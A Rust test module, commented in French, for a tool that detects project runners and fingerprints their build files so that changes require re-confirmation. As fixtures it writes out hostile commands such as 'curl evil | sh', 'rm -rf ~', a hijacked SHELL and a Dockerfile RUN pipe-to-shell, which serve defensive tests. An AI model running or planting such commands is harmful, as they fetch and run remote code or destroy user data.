        assert_eq!(find(&r, "justfile:test").command, ["just", "test"]);
        assert_eq!(find(&r, "justfile:test").kind, RunnerKind::Test);
    }

    #[test]
    fn cargo_package_and_workspace() {
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"seul\"\n"),
            ("src/main.rs", "fn main(){}"),
        ]);
        let r = detect(&m);
        assert_eq!(
            ids(&r),
            ["Cargo.toml:run", "Cargo.toml:test", "Cargo.toml:build"]
        );
        assert_eq!(find(&r, "Cargo.toml:run").command, ["cargo", "run"]);

        // Bibliothèque seule : pas de `cargo run`.
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"lib\"\n"),
            ("src/lib.rs", ""),
        ]);
        assert!(!ids(&detect(&m)).contains(&"Cargo.toml:run"));

        let m = Mem::with(&[
            (
                "Cargo.toml",
                "[workspace]\nmembers = [\"crates/*\", \"tools/cli\", \"../dehors\", \"x/**\"]\nexclude = [\"crates/old\"]\n",
            ),
            (
                "crates/core/Cargo.toml",
                "[package]\nname = \"core\"\n[[bin]]\nname = \"orchd\"\n",
            ),
            ("crates/lib/Cargo.toml", "[package]\nname = \"lib\"\n"),
            ("crates/lib/src/lib.rs", ""),
            ("crates/old/Cargo.toml", "[package]\nname = \"old\"\n"),
            ("crates/old/src/main.rs", ""),
            ("crates/bad/Cargo.toml", "[package]\nname = \"--bad\"\n"),
            ("crates/bad/src/main.rs", ""),
            ("tools/cli/Cargo.toml", "[package]\nname = \"cli\"\n"),
            ("tools/cli/src/main.rs", ""),
        ]);
        let r = detect(&m);
        assert_eq!(
            ids(&r),
            [
                "Cargo.toml:test",
                "Cargo.toml:build",
                "Cargo.toml:run:core",
                "Cargo.toml:run:cli",
            ]
        );
        assert_eq!(
            find(&r, "Cargo.toml:run:core").command,
            ["cargo", "run", "-p", "core"]
        );
        assert_eq!(
            find(&r, "Cargo.toml:test").command,
            ["cargo", "test", "--workspace"]
        );
    }

    #[test]
    fn go_compose_pyproject() {
        let m = Mem::with(&[
            ("go.mod", "module x\n"),
            ("main.go", "// c\npackage main\n"),
            ("main_test.go", "package main\n"),
            ("compose.yaml", "services: {}\n"),
            ("docker-compose.yml", "services: {}\n"),
            (
                "pyproject.toml",
                "[project]\nname = \"p\"\n[project.scripts]\nserve = \"p:main\"\n\"-x\" = \"p:x\"\n",
            ),
            ("uv.lock", ""),
        ]);
        let r = detect(&m);
        assert_eq!(find(&r, "go.mod:run").command, ["go", "run", "."]);
        assert_eq!(find(&r, "go.mod:test").command, ["go", "test", "./..."]);
        assert_eq!(
            find(&r, "compose.yaml:up").command,
            ["docker", "compose", "-f", "compose.yaml", "up"]
        );
        assert!(!ids(&r).contains(&"docker-compose.yml:up"));
        assert_eq!(
            find(&r, "pyproject.toml:serve").command,
            ["uv", "run", "serve"]
        );
        assert!(!ids(&r).contains(&"pyproject.toml:-x"));

        // Go sans paquet main : pas de `go run .`.
        let m = Mem::with(&[("go.mod", "module x\n"), ("lib.go", "package lib\n")]);
        assert!(!ids(&detect(&m)).contains(&"go.mod:run"));

        // pyproject sans verrou ni outil : rien (jamais deviné).
        let m = Mem::with(&[(
            "pyproject.toml",
            "[project]\nname = \"p\"\n[project.scripts]\nserve = \"p:main\"\n",
        )]);
        assert!(detect(&m).is_empty());
        // poetry déclaré, scripts de pdm.
        let m = Mem::with(&[(
            "pyproject.toml",
            "[tool.poetry]\nname = \"p\"\n[tool.poetry.scripts]\napp = \"p:main\"\n[tool.pdm.scripts]\nlint = \"ruff .\"\n",
        )]);
        let r = detect(&m);
        assert_eq!(
            find(&r, "pyproject.toml:app").command,
            ["poetry", "run", "app"]
        );
        assert_eq!(
            find(&r, "pyproject.toml:lint").command,
            ["pdm", "run", "lint"]
        );
    }

    #[test]
    fn skipped_subdirs_and_toml_errors() {
        let m = Mem::with(&[
            ("node_modules/x/package.json", r#"{"scripts":{"dev":"x"}}"#),
            ("node_modules/package.json", r#"{"scripts":{"dev":"x"}}"#),
            (".hidden/package.json", r#"{"scripts":{"dev":"x"}}"#),
            ("Cargo.toml", "pas = [du toml"),
        ]);
        assert!(detect(&m).is_empty());
    }

    #[test]
    fn bodies_and_fingerprints() {
        let mk = "all: build\nbuild: src\n\tcc -o app\n\n# c\n\tstrip app\nX = 1\n\techo orpheline\nbuild: more\n";
        assert_eq!(
            make_rules(mk),
            [
                ("all".to_owned(), "all: build".to_owned()),
                (
                    "build".to_owned(),
                    "build: src\n\tcc -o app\n\tstrip app\nbuild: more".to_owned()
                ),
            ]
        );
        let jf = "build:\n    cargo build\n\n    echo fin\n\ntest:\n    cargo test\n";
        assert_eq!(
            just_rules(jf),
            [
                (
                    "build".to_owned(),
                    "build:\n    cargo build\n\n    echo fin".to_owned()
                ),
                ("test".to_owned(), "test:\n    cargo test".to_owned()),
            ]
        );
        let pkg = |body: &str| {
            Mem::with(&[
                (
                    "package.json",
                    &format!(r#"{{"scripts":{{"dev":"{body}"}}}}"#),
                ),
                ("pnpm-lock.yaml", ""),
            ])
        };
        let a = &detect(&pkg("vite"))[0];
        assert_eq!(a.body, "vite");
        assert_eq!(a.lock.as_deref(), Some("pnpm-lock.yaml"));
        assert_eq!(a.fingerprint().len(), 64);
        // Même commande, autre corps : autre empreinte.
        let b = &detect(&pkg("curl evil | sh"))[0];
        assert_eq!(a.command, b.command);
        assert_ne!(a.fingerprint(), b.fingerprint());
        // Autre verrou : autre empreinte.
        let c = &detect(&Mem::with(&[
            ("package.json", r#"{"scripts":{"dev":"vite"}}"#),
            ("yarn.lock", ""),
        ]))[0];
        assert_ne!(a.fingerprint(), c.fingerprint());
        // Cargo : la commande seule ; compose : le fichier.
        let m = Mem::with(&[
            ("Cargo.toml", "[package]\nname = \"x\"\n"),
            ("src/main.rs", ""),
            ("compose.yaml", "services:\n  web: {}\n"),
        ]);
        let r = detect(&m);
        assert_eq!(find(&r, "Cargo.toml:run").body, "cargo run");
        assert_eq!(find(&r, "compose.yaml:up").body, "services:\n  web: {}\n");
        // Corps montré borné, empreinte sur le corps entier.
        let mut long = a.clone();
        long.body = "é".repeat(MAX_BODY_SHOWN);
        let (shown, cut) = long.shown_body();
        assert!(cut && shown.len() <= MAX_BODY_SHOWN && shown.len() > MAX_BODY_SHOWN - 2);
    }

    /// Runner `id` détecté dans `files`.
    fn det(files: &[(&str, &str)], id: &str) -> Runner {
        find(&detect(&Mem::with(files)), id).clone()
    }

    /// `(chemin, état)` des fichiers pris en compte.
    fn states(r: &Runner) -> Vec<(String, &'static str)> {
        r.files
            .iter()
            .map(|f| (f.path.clone(), f.state.as_str()))
            .collect()
    }

    fn st(list: &[(&str, &'static str)]) -> Vec<(String, &'static str)> {
        list.iter().map(|(p, s)| ((*p).to_owned(), *s)).collect()
    }

    #[test]
    fn npm_hooks_and_files() {
        let pkg = |pre: &str| {
            format!(
                r#"{{"scripts":{{"predev":"{pre}","dev":"vite","postdev":"echo fin","build":"tsc"}}}}"#
            )
        };
        let a = pkg("node gen.js");
        let base = [("package.json", a.as_str()), ("pnpm-lock.yaml", "v")];
        let r = det(&base, "package.json:dev");
        assert_eq!(
            r.body,
            "[predev] node gen.js\n[dev] vite\n[postdev] echo fin"
        );
        assert_eq!(
            states(&r),
            st(&[
                ("package.json", "ok"),
                ("pnpm-lock.yaml", "ok"),
                (".npmrc", "absent")
            ])
        );
        assert_eq!(r.files[0].size, Some(a.len() as u64));
        let full = r.full_body();
        assert!(full.starts_with(
            "Fichiers pris en compte (toute modification redemande la confirmation) :\n\
             - package.json — "
        ));
        assert!(full.contains("- .npmrc — absent (réglages du gestionnaire)"));
        assert!(full.ends_with("\n\n[predev] node gen.js\n[dev] vite\n[postdev] echo fin"));
        // Crochet modifié, verrou modifié, `.npmrc` apparu : autre empreinte.
        let b = pkg("curl evil | sh");
        let r2 = det(
            &[("package.json", &b), ("pnpm-lock.yaml", "v")],
            "package.json:dev",
        );
        assert!(r2.body.contains("[predev] curl evil | sh"));
        assert_ne!(r.fingerprint(), r2.fingerprint());
        let r3 = det(
            &[("package.json", &a), ("pnpm-lock.yaml", "w")],
            "package.json:dev",
        );
        assert_ne!(r.fingerprint(), r3.fingerprint());
        let r4 = det(
            &[
                ("package.json", &a),
                ("pnpm-lock.yaml", "v"),
                (".npmrc", "script-shell=/tmp/x"),
            ],
            "package.json:dev",
        );
        assert_ne!(r.fingerprint(), r4.fingerprint());
        // Même pour un autre script du même fichier : le fichier entier compte.
        assert_eq!(det(&base, "package.json:build").body, "tsc");
        assert_eq!(
            det(&base, "package.json:build").files,
            det(&base, "package.json:dev").files
        );
    }

    #[test]
    fn make_prerequisites_settings_and_includes() {
        let mk = |recipe: &str, shell: &str| {
            format!(
                "SHELL := {shell}\n.ONESHELL:\n\
                 include mk/commun.mk ../dehors.mk $(X).mk\n-include option.mk\n\
                 all: $(DEPS) build\nbuild: gen | dossier\n\tcc -o app\ngen:\n\t{recipe}\n\
                 dossier:\n\tmkdir -p d\n%.o: %.c\n\tcc -c $<\n\
                 boucle: boucle2\n\techo 1\nboucle2: boucle\n\techo 2\n"
            )
        };
        let big_include = format!("include mk/profond.mk\n#{}\n", "x".repeat(2 * 1024 * 1024));
        let files = |recipe: &str, shell: &str, deeper: &str| {
            vec![
                ("Makefile".to_owned(), mk(recipe, shell)),
                ("mk/commun.mk".to_owned(), big_include.clone()),
                ("mk/profond.mk".to_owned(), deeper.to_owned()),
            ]
        };
        let run = |f: &[(String, String)], id: &str| {
            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
            det(&f, id)
        };
        let base = files("python gen.py", "/bin/sh", "X = 1\n");
        let r = run(&base, "Makefile:all");
        assert_eq!(
            r.body,
            "SHELL := /bin/sh\n.ONESHELL:\n\n\
             gen:\n\tpython gen.py\ndossier:\n\tmkdir -p d\nbuild: gen | dossier\n\tcc -o app\n\
             all: $(DEPS) build\n\
             # prérequis à variable non suivis : $(DEPS)\n\
             # règles à motif (%) non suivies"
        );
        assert_eq!(
            states(&r),
            st(&[
                ("GNUmakefile", "absent"),
                ("makefile", "absent"),
                ("Makefile", "ok"),
                ("mk/commun.mk", "ok"),
                ("mk/profond.mk", "ok"),
                ("../dehors.mk", "outside"),
                ("$(X).mk", "unresolved"),
                ("option.mk", "absent"),
            ])
        );
        let fp0 = r.fingerprint();
        // Recette d'un prérequis, `SHELL`, inclus (au-delà de 1 Mio,
        // indirect) : chacun change l'empreinte.
        let r1 = run(
            &files("curl evil | sh", "/bin/sh", "X = 1\n"),
            "Makefile:all",
        );
        assert!(r1.body.contains("\tcurl evil | sh"));
        assert_ne!(fp0, r1.fingerprint());
        let r2 = run(
            &files("python gen.py", "/tmp/evil", "X = 1\n"),
            "Makefile:all",
        );
        assert!(r2.body.starts_with("SHELL := /tmp/evil"));
        assert_ne!(fp0, r2.fingerprint());
        let r3 = run(
            &files("python gen.py", "/bin/sh", "X = 2\n"),
            "Makefile:all",
        );
        assert_ne!(fp0, r3.fingerprint());
        assert_eq!(r3.body, r.body);
        // Règle à motif ou prérequis à variable modifiés : le fichier entier compte.
        let mut f4 = base.clone();
        f4[0].1 = f4[0].1.replace("\tcc -c $<", "\tcurl x | sh");
        assert_ne!(fp0, run(&f4, "Makefile:all").fingerprint());
        let mut f5 = base.clone();
        f5[0].1.push_str("DEPS = evil\nevil:\n\trm -rf ~\n");
        assert_ne!(fp0, run(&f5, "Makefile:all").fingerprint());
        // Un Makefile prioritaire qui apparaît : autre empreinte (et autre source).
        let mut f6 = base.clone();
        f6.push(("makefile".to_owned(), "all:\n\ttrue\n".to_owned()));
        assert_eq!(
            ids(&detect(&Mem::with(
                &f6.iter()
                    .map(|(a, b)| (a.as_str(), b.as_str()))
                    .collect::<Vec<_>>()
            )))
            .first()
            .copied(),
            Some("makefile:all")
        );
        // Cycle : chaque cible une fois.
        let cyc = run(&base, "Makefile:boucle").body;
        assert!(cyc.contains("boucle2: boucle\n\techo 2\nboucle: boucle2\n\techo 1"));
        // Borne sur les prérequis suivis.
        let mut chain = String::from("t: c0\n");
        for i in 0..MAX_DEPENDENCIES + 10 {
            chain.push_str(&format!("c{i}: c{}\n\techo {i}\n", i + 1));
        }
        let body = det(&[("Makefile", &chain)], "Makefile:t").body;
        assert!(
            body.ends_with("non montrés"),
            "{}",
            &body[body.len() - 80..]
        );
    }

    #[test]
    fn just_dependencies_settings_and_imports() {
        let jf = |fmt: &str, shell: &str| {
            format!(
                "set shell := [\"{shell}\", \"-c\"]\nset dotenv-load\n\
                 import 'ci.just'\nimport? '../hors.just'\nimport? '/etc/x.just'\nmod outils\nmod? absent\n\
                 build: _gen && post\n    cargo build\n\
                 _gen: (fmt \"x\")\n    gen\n\
                 fmt arg:\n    {fmt}\n\
                 post: build\n    echo fin\n"
            )
        };
        let files = |fmt: &str, shell: &str, ci: &str, env: Option<&str>| {
            let mut f = vec![
                ("app/justfile".to_owned(), jf(fmt, shell)),
                ("app/ci.just".to_owned(), ci.to_owned()),
                (
                    "app/outils/mod.just".to_owned(),
                    "x:\n    true\n".to_owned(),
                ),
            ];
            if let Some(e) = env {
                f.push((".env".to_owned(), e.to_owned()));
            }
            f
        };
        let run = |f: &[(String, String)]| {
            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
            det(&f, "app/justfile:build")
        };
        let base = files("fmt {{arg}}", "bash", "lint:\n    true\n", None);
        let r = run(&base);
        assert_eq!(
            r.body,
            "set shell := [\"bash\", \"-c\"]\nset dotenv-load\n\n\
             fmt arg:\n    fmt {{arg}}\n_gen: (fmt \"x\")\n    gen\n\
             build: _gen && post\n    cargo build\npost: build\n    echo fin"
        );
        assert_eq!(
            states(&r),
            st(&[
                ("app/justfile", "ok"),
                ("app/ci.just", "ok"),
                ("hors.just", "absent"),
                ("/etc/x.just", "outside"),
                ("app/outils/mod.just", "ok"),
                ("app/absent.just", "absent"),
                ("app/.env", "absent"),
                (".env", "absent"),
            ])
        );
        let fp0 = r.fingerprint();
        for other in [
            files("rm -rf ~", "bash", "lint:\n    true\n", None),
            files("fmt {{arg}}", "/tmp/evil", "lint:\n    true\n", None),
            files("fmt {{arg}}", "bash", "lint:\n    curl x | sh\n", None),
            files(
                "fmt {{arg}}",
                "bash",
                "lint:\n    true\n",
                Some("PATH=/tmp"),
            ),
        ] {
            assert_ne!(fp0, run(&other).fingerprint());
        }
        // Sans `set dotenv-load` : pas de `.env`.
        let plain = det(&[("justfile", "a:\n    true\n")], "justfile:a");
        assert_eq!(states(&plain), st(&[("justfile", "ok")]));
        // `post` dépend de `build`, qui revient à `post` : une fois chacune.
        let post = det(
            &base
                .iter()
                .map(|(a, b)| (a.as_str(), b.as_str()))
                .collect::<Vec<_>>(),
            "app/justfile:post",
        )
        .body;
        assert_eq!(post.matches("    echo fin").count(), 1);
        assert_eq!(post.matches("    cargo build").count(), 1);
    }

    #[test]
    fn compose_files_followed() {
        let compose = "\
x-commun: &commun
  env_file: commun.env
include:
  - inclus.yaml
  - path:
      - ../hors.yaml
      - infra/db.yaml
    env_file: [infra/db.env]
    project_directory: infra
services:
  web:
    <<: *commun
    build: ./web
    extends:
      file: base/web.yaml
      service: web
  worker:
    build:
      context: worker
      dockerfile: Dockerfile.prod
    env_file:
      - path: worker.env
        required: false
  bizarre:
    build: { context: [1] }
    extends: { file: [x] }
  local:
    extends: web
";
        let files = |dockerfile: &str| {
            vec![
                ("app/compose.yaml".to_owned(), compose.to_owned()),
                (
                    "app/inclus.yaml".to_owned(),
                    "services:\n  a:\n    env_file: a.env\n".to_owned(),
                ),
                ("app/infra/db.yaml".to_owned(), "services: {}\n".to_owned()),
                ("app/base/web.yaml".to_owned(), "services: {}\n".to_owned()),
                ("app/web/Dockerfile".to_owned(), dockerfile.to_owned()),
                (
                    "app/worker/Dockerfile.prod".to_owned(),
                    "FROM x\n".to_owned(),
                ),
                ("hors.yaml".to_owned(), "x".to_owned()),
            ]
        };
        let run = |f: &[(String, String)]| {
            let f: Vec<(&str, &str)> = f.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
            det(&f, "app/compose.yaml:up")
        };
        let r = run(&files("FROM nginx\n"));
        assert_eq!(r.body, compose);
        let got = states(&r);
        for want in [
            ("app/compose.yaml", "ok"),
            ("app/inclus.yaml", "ok"),
            ("app/a.env", "absent"),
            ("hors.yaml", "ok"),
            ("app/infra/db.yaml", "ok"),
            ("app/infra/db.env", "absent"),
            ("app/infra/.env", "absent"),
            ("app/commun.env", "absent"),
            ("app/web/Dockerfile", "ok"),
            ("app/base/web.yaml", "ok"),
            ("app/worker/Dockerfile.prod", "ok"),
            ("app/worker.env", "absent"),
            ("app/.env", "absent"),
        ] {
            assert!(
                got.contains(&(want.0.to_owned(), want.1)),
                "{want:?} absent de {got:?}"
            );
        }
        // Formes non lues : signalées sur le fichier compose.
        let unread: Vec<&str> = r
            .files
            .iter()
            .filter(|f| f.state == FileState::Unresolved)
            .map(|f| f.note.as_str())
            .collect();
        assert_eq!(
            unread,
            [
                "forme non lue : extends.file = […]",
                "forme non lue : build = {…}"
            ]
        );
        // Dockerfile modifié : autre empreinte.
        assert_ne!(
            r.fingerprint(),
            run(&files("FROM nginx\nRUN curl x | sh\n")).fingerprint()
        );
        // YAML illisible : runner gardé, signalé.
        let bad = det(&[("compose.yaml", "services: [\n")], "compose.yaml:up");
        assert!(bad.files.iter().any(|f| f.state == FileState::Unresolved
            && f.note.starts_with("forme non lue : YAML illisible")));
        // Trop gros : runner gardé, état visible, corps vide mais fichiers dits.
        let huge = "#".repeat(MAX_HASH_BYTES as usize + 1);
        let big = det(&[("compose.yaml", &huge)], "compose.yaml:up");
        assert_eq!(big.files[0].state, FileState::TooLarge);
        assert_eq!(big.files[0].size, Some(MAX_HASH_BYTES + 1));
        assert!(
            big.full_body()
                .contains("compose.yaml — trop gros pour être montré")
        );
        // Haché quand même, en entier : modifié à taille égale → autre empreinte.
        let mut huge2 = huge.clone();
        huge2.replace_range(1000..1001, "x");
        let big2 = det(&[("compose.yaml", &huge2)], "compose.yaml:up");
        assert_eq!(big2.files[0].size, big.files[0].size);
        assert_ne!(big.fingerprint(), big2.fingerprint());
        assert!(big.files[0].note.contains("haché en entier"));
        // Au-delà de la borne du hachage par blocs : seule la taille compte.
        let mut m = Mem::with(&[("compose.yaml", &huge)]);
        m.stream_max = MAX_HASH_BYTES;
        let only_size = find(&detect(&m), "compose.yaml:up").clone();
        m.files.insert("compose.yaml".into(), huge2.clone());
        let only_size2 = find(&detect(&m), "compose.yaml:up").clone();
        assert_eq!(only_size.fingerprint(), only_size2.fingerprint());
        assert!(only_size.files[0].note.contains("seule la taille compte"));
    }

    #[test]
    fn referenced_paths_are_resolved_under_the_root() {
        assert_eq!(resolve_ref("app", "mk/a.mk"), Ok("app/mk/a.mk".into()));
        assert_eq!(resolve_ref("app", "./../b.mk"), Ok("b.mk".into()));
        assert_eq!(resolve_dir("app", ".."), Ok(String::new()));
        assert_eq!(resolve_dir("", "."), Ok(String::new()));
        for (w, state) in [
            ("../../x", FileState::Outside),
            ("/etc/passwd", FileState::Outside),
            ("~/x", FileState::Outside),
            ("..", FileState::Outside),
            ("$(HOME)/x", FileState::Unresolved),
            ("*.mk", FileState::Unresolved),
            ("${X}.yaml", FileState::Unresolved),
            ("oci://registry/x", FileState::Unresolved),
        ] {
            assert_eq!(resolve_ref("app", w).map_err(|e| e.0), Err(state), "{w}");
        }
        // Empreinte : commande, dossier, source et fichiers triés seulement.
        let r = det(&[("go.mod", "module x\n")], "go.mod:test");
        let files = vec![("go.mod", "ok", r.files[0].digest.as_str())];
        let v = serde_json::json!([r.command, r.cwd, r.source, files]);
        assert_eq!(
            r.fingerprint(),
            super::super::files::sha256_hex(v.to_string().as_bytes())
        );
        assert_eq!(
            r.files[0].digest,
            super::super::files::sha256_hex(b"module x\n")
        );
    }

    #[test]
    fn classification() {
        assert_eq!(classify("dev"), RunnerKind::Dev);
        assert_eq!(classify("start:prod"), RunnerKind::Dev);
        assert_eq!(classify("serve"), RunnerKind::Dev);
        assert_eq!(classify("test-e2e"), RunnerKind::Test);
        assert_eq!(classify("e2e"), RunnerKind::Test);
        assert_eq!(classify("typecheck"), RunnerKind::Lint);
        assert_eq!(classify("Build"), RunnerKind::Build);
        assert_eq!(classify("deploy"), RunnerKind::Other);
    }

    #[test]
    fn ports() {
        let p = preferred_port(Path::new("/home/u/projet--feature"));
        assert!((PORT_MIN..=PORT_MAX).contains(&p));
        assert_eq!(p, preferred_port(Path::new("/home/u/projet--feature")));
        let reserved: HashSet<u16> = [p].into();
        let next = pick_port(p, &reserved, |q| {
            q == p + 1 || (p == PORT_MAX && q == PORT_MIN)
        });
        assert!(next.is_some_and(|n| n != p && n != p + 1));
        assert_eq!(
            pick_port(PORT_MAX, &HashSet::new(), |q| q == PORT_MAX),
            Some(PORT_MIN)
        );
        assert_eq!(pick_port(PORT_MIN, &HashSet::new(), |_| true), None);
    }

    #[test]
    fn urls_in_output() {
        assert_eq!(
            extract_urls("  ➜  Local:   http://localhost:5173/"),
            ["http://localhost:5173/"]
        );
        assert_eq!(
            extract_urls("listening on 127.0.0.1:8080, see https://[::1]:8443/app?x=1."),
            ["http://127.0.0.1:8080/", "https://[::1]:8443/app?x=1"]
        );
        assert_eq!(
            extract_urls("Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C)"),
            ["http://127.0.0.1:8000/"]
        );
        assert!(
            extract_urls("notlocalhost:3000 localhost: 3000 localhost:99999 localhost:80a")
                .is_empty()
        );
        assert!(extract_urls("http://example.com:3000/").is_empty());
        assert_eq!(
            extract_urls("http://LOCALHOST:3000/Path"),
            ["http://localhost:3000/Path"]
        );
    }

    #[test]
    fn scanner_strips_ansi_across_chunks() {
        let mut s = UrlScanner::new();
        // Vite colore le port : séquences au milieu de l'URL, coupées entre
        // deux lectures ; titre OSC et lien OSC 8 autour.
        let out = b"\x1b]0;titre\x07  \x1b[32m\xe2\x9e\x9c\x1b[39m  Local:   \x1b[36mhttp://localhost:\x1b[1m51";
        assert!(!s.feed(out));
        assert!(s.feed(b"73\x1b[22m/\x1b[39m\r\n"));
        assert_eq!(s.urls(), ["http://localhost:5173/"]);
        // Doublon : rien de nouveau.
        assert!(!s.feed(b"http://localhost:5173/\n"));
        // Dernière ligne sans fin de ligne.
        assert!(!s.feed(b"\x1b]8;;http://x\x1b\\lien\x1b]8;;\x1b\\ 127.0.0.1:9000"));
        assert!(s.finish());
        assert_eq!(
            s.urls(),
            ["http://localhost:5173/", "http://127.0.0.1:9000/"]
        );
    }

    #[test]
    fn unterminated_sequences_do_not_swallow_the_output() {
        // OSC jamais terminé, abandonné sur CAN : la ligne suivante compte.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b]0;titre sans fin\x18\nhttp://localhost:3000/\n");
        assert_eq!(s.urls(), ["http://localhost:3000/"]);
        // DCS abandonné sur SUB.
        let mut s = UrlScanner::new();
        s.feed(b"\x1bPq#0;2;0;0;0\x1a http://localhost:3001/\n");
        assert_eq!(s.urls(), ["http://localhost:3001/"]);
        // Chaîne sans fin ni CAN : abandonnée après 4 096 octets.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b]8;;");
        s.feed(&vec![b'x'; MAX_SEQUENCE + 1]);
        s.feed(b"\nhttp://127.0.0.1:4000/\n");
        assert_eq!(s.urls(), ["http://127.0.0.1:4000/"]);
        // CSI interminable (paramètres seulement) : idem.
        let mut s = UrlScanner::new();
        s.feed(b"\x1b[");
        s.feed(&vec![b'1'; MAX_SEQUENCE + 1]);
        s.feed(b"\nhttp://localhost:4001/\n");
        assert_eq!(s.urls(), ["http://localhost:4001/"]);
    }

    #[test]
    fn scanner_is_bounded() {
        let mut s = UrlScanner::new();
        for p in 1..40 {
            s.feed(format!("http://localhost:{}\n", 3000 + p).as_bytes());
        }
        assert_eq!(s.urls().len(), MAX_URLS);
        // Une ligne interminable ne fait pas grossir le tampon.
        s.feed(&vec![b'a'; 10 * MAX_LINE]);
        assert!(s.line.len() < MAX_LINE);
    }
}
